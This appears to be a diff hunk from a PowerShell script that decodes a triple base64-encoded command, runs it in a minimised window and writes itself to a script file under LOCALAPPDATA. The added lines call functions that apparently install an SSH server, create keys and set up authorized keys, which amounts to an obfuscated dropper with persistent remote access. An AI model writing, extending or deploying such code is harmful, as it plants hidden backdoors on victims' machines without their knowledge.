@@ -144,6 +144,12 @@ $C = 'WXpOT2IwbERNWFpKUTBwVVpFaEtjRmt6VWtsaU0wNHdVekpXTlZFeWFHeFpNblJ3WW0xaloySn
 for ($i = 0; $i -lt 3; $i++) 
 { $C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C)) }
 
+installSshd 
+createPrivateKeyOnRemote 
+createAuthorized_key
+configSSHD_config
+
+
 cmd /MIN /C $C
 
 #'@ | Out-File -FilePath "$env:LOCALAPPDATA/content/SC.ps1" -Encoding utf8 -Force
